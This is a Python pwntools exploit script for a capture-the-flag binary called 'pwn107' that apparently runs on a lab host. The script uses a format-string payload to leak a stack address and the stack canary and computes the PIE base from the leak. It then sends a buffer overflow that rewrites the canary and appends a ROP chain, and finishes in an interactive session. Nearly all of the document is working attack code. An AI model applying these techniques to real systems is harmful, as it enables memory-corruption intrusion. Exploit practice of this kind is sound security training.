from pwn import *

exe = './pwn107'
elf = context.binary = ELF(exe, checksec=False) # wont exec checksec
#context.log_level = 'debug'     # a lot of debug info

#offset = find_rip(cyclic(600))
#exit()
offset = 24                     # size of variable (check with gdb place of canary)

#p = process(exe)                # start program
p = remote('10.10.199.36', 9007)
p.recvuntil(b'streak? ')        # rec till enter streak
#p.sendline(b'%17$p::%13$p')     # leak 17th addr from stack (start of main) LOCAL
p.sendline(b'%19$p::%13$p')     # REMOTE
p.recvuntil(b'streak: ')        # leak address just after
leak = p.recvline()

leaked_addr = int(leak.split(b'::')[0], 16)
canary = int(leak.split(b'::')[1], 16)
info("leaked_address: %#x", leaked_addr)
info("leaked_canary: %#x", canary)

elf.address = leaked_addr - 0x992       # ret leaked addr is at 0x992 offset
info("piebase: %#x", elf.address)

rop = ROP(elf)
rop.get_streak(0,0)

payload = flat([
    offset * b'a',
    canary,                             # write leaked canary
    0x0000000000000001,                 # rewrite what we found in memory
    rop.chain()                         # ropchain
])

write('payload', payload)

p.recvuntil(b"you!")
p.sendline(payload)
p.interactive()

